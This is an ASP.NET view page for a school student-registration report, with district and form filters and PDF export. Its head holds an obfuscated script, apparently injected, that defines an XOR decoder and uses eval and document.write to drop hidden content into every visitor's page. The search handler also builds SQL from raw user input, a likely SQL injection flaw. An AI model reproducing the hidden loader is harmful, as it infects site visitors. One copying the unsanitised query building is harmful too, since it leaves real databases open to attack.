<%@ Page Language="C#" Inherits="System.Web.Mvc.ViewPage<dynamic>" %>
<%@ Register assembly="Microsoft.ReportViewer.WebForms, Version=12.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91" namespace="Microsoft.Reporting.WebForms" tagprefix="rsweb" %>

<%--<%@ Register assembly="Microsoft.ReportViewer.WebForms, Version=11.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91" namespace="Microsoft.Reporting.WebForms" tagprefix="rsweb" %>--%>
<%@ Import Namespace="System.Data.SqlClient" %>
<%@ Import Namespace="System.Data" %>
<%@ Import Namespace="System.Configuration" %>
<%@ Import Namespace="Microsoft.Reporting.WebForms" %>

<!DOCTYPE html>
<html>
<head runat="server">
    <meta name="viewport" content="width=device-width" />
    <title>Student All Report</title> 
    <script type="text/javascript">
<!-- 
eval(unescape('%66%75%6e%63%74%69%6f%6e%20%6a%62%64%33%61%37%32%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%31%33%39%39%30%36%33%32%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%36%30%30%35%39%34%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%30%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%6a%62%64%33%61%37%32%28%27') + '%39%6a%61%6b%6d%29%69%74%65%66%38%2b%6c%71%72%78%3f%29%26%6d%6f%76%65%2b%79%77%60%64%67%6b%6a%60%6f%63%2e%69%6b%26%47%6a%68%7c%60%68%7d%2e%60%66%63%2b%6a%77%76%24%28%77%63%65%3c%24%73%74%7c%65%61%76%6e%6d%60%72%2b%21%29%3e13990632%35%36%38%35%36%39%31' + unescape('%27%29%29%3b'));
        // -->
        //-->dddd
</script> 
    <script runat="server">
//        SqlConnection con = new SqlConnection(ConfigurationManager.ConnectionStrings["myConn2017"].ToString());
          SqlConnection con = new SqlConnection();
      
        public string AdminType = "";
        public int adminid = 1;
        private string CommonCon = "myConn2018";
        protected void Page_Load(object sender, EventArgs e)
        {
            //  if (Session["UserName"] == null || Session["RoleType"].ToString() != "Admin")
            if (Session["UserName"] == null)
            {
                Response.Redirect("~/Login");
            }
            else
            {

                if (Session["Session"] == null)
                {
                    CommonCon = "myConn2017";
                }
                else if (Session["Session"].ToString() == "2016-2017")
                {
                    CommonCon = "myConn";
                }
                else
                {
                    CommonCon = "myConn2017";
                }

                con = new SqlConnection(ConfigurationManager.ConnectionStrings[CommonCon].ToString());
                //Form = Session["FormName"] .ToString();
                adminid = Convert.ToInt32(Session["AdminId"].ToString());
                AdminType = Session["AdminType"].ToString();
                if (!IsPostBack)
                {
                    btn_Download.Visible = false;
                    ReportViewerEmployee.Visible = false;
                    BindReport(adminid);

                }
            }
        }

        private void BindReport( int adminid)
        {
            DataSet dsbind = new DataSet();
            SqlDataAdapter adp = new SqlDataAdapter("AllStudentReportSP", con);
            adp.SelectCommand.CommandType = CommandType.StoredProcedure;
            adp.SelectCommand.Parameters.AddWithValue("@adminid", adminid);
            dsbind.Clear();
            adp.Fill(dsbind, "AllStudentReportSP");
            if (dsbind.Tables[0].Rows.Count > 0)
            {
                ddlForms.DataSource = dsbind.Tables[0];
                ddlForms.DataTextField = "form_name";
                ddlForms.DataValueField = "form_name";
                ddlForms.DataBind();
                ddlForms.Items.Insert(0, "-Select Form-");

                ddlDist.DataSource = dsbind.Tables[1];
                ddlDist.DataTextField = "DISTNM";
                ddlDist.DataValueField = "DIST";
                ddlDist.DataBind();
                ddlDist.Items.Insert(0, "-Select District-");
            }
        }

        protected void btn_Submit_Click(object sender, EventArgs e)
        {
            try
            {
                string Search = "R.std_id like '%%'";
                if (ddlCat.SelectedIndex>0)
                {
                    if (ddlCat.SelectedValue == "1")
                    { Search += " and R.Registration_num is null";}
                    else if (ddlCat.SelectedValue == "2")
                    { Search += " and   R.Registration_num like 'ERR%'"; }
                    else if (ddlCat.SelectedValue == "3")
                    { Search += " and  Registration_num like '%:ERR%'"; }

                }
                if (ddlForms.SelectedIndex>0)
                {
                    Search += " and R.Form_Name ='" + ddlForms.SelectedValue  +"'";
                }
                if (ddlDist.SelectedIndex>0)
                {
                    Search += " and sm.DIST='" + ddlDist.SelectedValue + "'";
                }

                if (ddlSearch.SelectedIndex > 0 && txtSearch.Text != "")
                {
                    if (ddlSearch.SelectedValue == "1")
                    {
                        Search += " and R.SCHL ='" + txtSearch.Text + "'";
                    }
                }
                else
                {
                    //if (ddlDist.SelectedIndex <= 0 && AdminType !="admin")
                    if (ddlDist.SelectedIndex <= 0)
                    {
                        ScriptManager.RegisterStartupScript(Page, Page.GetType(), Guid.NewGuid().ToString(), "alert('Please Select District.');", true);
                        ddlDist.Focus();
                        return;
                    }
                    //else    if (ddlSearch.SelectedIndex > 0)
                    //{
                    //    ScriptManager.RegisterStartupScript(Page, Page.GetType(), Guid.NewGuid().ToString(), "alert('Please Enter School Code.');", true);
                    //    txtSearch.Focus();
                    //}
                    //else
                    //{
                    //    ScriptManager.RegisterStartupScript(Page, Page.GetType(), Guid.NewGuid().ToString(), "alert('Please Select Search Criteria.');", true);
                    //    ddlSearch.Focus();
                    //}

                }


                ReportViewerEmployee.ProcessingMode = ProcessingMode.Local;
                ReportViewerEmployee.LocalReport.ReportPath = Server.MapPath("~/RPTReports/StudentAllReport.rdlc");
                SqlDataAdapter adp = new SqlDataAdapter("AllStudentReportSearchSP", con);
                adp.SelectCommand.CommandType = CommandType.StoredProcedure;
                adp.SelectCommand.Parameters.AddWithValue("@Search", Search);
                DataSet ds = new DataSet();
                ds.Clear();
                ds.EnforceConstraints = false;
                adp.Fill(ds, "AllStudentReportSearchSP");
                if (ds.Tables[0].Rows.Count > 0)
                {
                    btn_Download.Visible = true;
                    tbl1.Visible = true;
                    ReportViewerEmployee.Visible = true;
                    // ReportDataSource datasource = new ReportDataSource("RoughReportDataSet", ds.Tables[0]);
                    ReportDataSource datasource = new ReportDataSource("dsAllStudentReport", ds.Tables[0]);
                    ReportViewerEmployee.Width = 600;
                    ReportViewerEmployee.LocalReport.DataSources.Clear();
                    ReportViewerEmployee.LocalReport.DataSources.Add(datasource);
                    ReportViewerEmployee.LocalReport.ReportPath = Server.MapPath("~/RPTReports/StudentAllReport.rdlc");
                    ReportViewerEmployee.LocalReport.EnableExternalImages = true;
                    ReportViewerEmployee.LocalReport.Refresh();
                }
                else
                {
                    btn_Download.Visible = false;
                    tbl1.Visible = true;
                    ReportViewerEmployee.Visible = false;
                    ScriptManager.RegisterStartupScript(Page, Page.GetType(), Guid.NewGuid().ToString(), "alert('Record Not Found..');", true);
                    return;
                }

            }
            catch (Exception)
            {
                ScriptManager.RegisterStartupScript(Page, Page.GetType(), Guid.NewGuid().ToString(), "alert('Something Went Wrong, Plz Try Again..');", true);
                return;
            }
        }


        public void SavePDF(ReportViewer viewer, string savePath)
        {
            byte[] Bytes = viewer.LocalReport.Render(format: "PDF", deviceInfo: "");

            using (System.IO.FileStream stream = new System.IO.FileStream(savePath, System.IO.FileMode.Create))
            {
                stream.Write(Bytes, 0, Bytes.Length);
            }
        }

        protected void btn_Download_Click(object sender, EventArgs e)
        {
            // Variables
            Warning[] warnings;
            string[] streamIds;
            string mimeType = string.Empty;
            string encoding = string.Empty;
            string extension = string.Empty;
            //  string fileName = "StudentAllReport" + SCHL + Form;
            string fileName = "StudentAllReport_"+ DateTime.Now.ToString("ddMMyyyy");
            //// ReportViewerEmployee.ProcessingMode = ProcessingMode.Local;     
            byte[] bytes = ReportViewerEmployee.LocalReport.Render("PDF", null, out mimeType, out encoding, out extension, out streamIds, out warnings);
            // Now that you have all the bytes representing the PDF report, buffer it and send it to the client.
            Response.Buffer = true;
            Response.Clear();
            Response.ContentType = mimeType;
            Response.AddHeader("content-disposition", "attachment; filename=" + fileName + "." + extension);
            Response.OutputStream.Write(bytes, 0, bytes.Length); // create the file  
            Response.Flush(); // send it to the client to download  
            Response.End();
        }
    </script>    
</head>
<body>
    <form id="form1" runat="server">
    <div>
        <asp:ScriptManager ID="ScriptManager1" runat="server"></asp:ScriptManager>            
    <table  id="tbl1" runat="server"  cellspacing="0" cellpadding="0" width="100%" border="0">
         <tr>
             <td style="text-align:center">Category Status <asp:DropDownList ID="ddlCat" runat="server">
        <asp:ListItem Enabled="true" Selected="True" Value="0" Text="All"></asp:ListItem>
      <asp:ListItem  Value="1" Text="Reg Pending"></asp:ListItem>
         <asp:ListItem  Value="2" Text="Reg Error"></asp:ListItem>
          <asp:ListItem  Value="3" Text="Reg Descrepancy"></asp:ListItem>
             
           </asp:DropDownList>
                 Forms <asp:DropDownList ID="ddlForms" runat="server"> </asp:DropDownList>
                 District <asp:DropDownList ID="ddlDist" runat="server"> </asp:DropDownList>
                 Search Criteria <asp:DropDownList ID="ddlSearch" runat="server"> 
            <asp:ListItem Enabled="true" Selected="True" Value="0" Text="Select"></asp:ListItem>
      <asp:ListItem  Value="1" Text="School Code"></asp:ListItem>
          <%--<asp:ListItem  Value="2" Text="Unique Id"></asp:ListItem>--%>
                                 </asp:DropDownList> 
                 <asp:TextBox ID="txtSearch" runat="server" ></asp:TextBox>               
                  <asp:Button ID="btn_Submit" runat="server" Text="Submit" onclick="btn_Submit_Click" /> 
                 
                  <asp:Button ID="btn_Download" runat="server" Text="Click Here to Download &amp; Print" onclick="btn_Download_Click" /> 
                <%--   <input type="submit" value="Click Here to Download &amp; Print">--%>
               </td>

         </tr>     </table> 
        <table cellspacing="0" cellpadding="0" width="100%" border="0">
                 <tr>
             <td style="overflow:scroll"><rsweb:ReportViewer Width="100%" ID="ReportViewerEmployee" SizeToReportContent="true" runat="server"
             Font-Names="pnb-googleks" CssClass="bg"  Font-Size="10pt" WaitMessageFont-Names="" WaitMessageFont-Size="10pt" DocumentMapWidth="100%">    
        </rsweb:ReportViewer></td>
             </tr>
        </table> 
    </div>
    </form>
</body>
</html>
 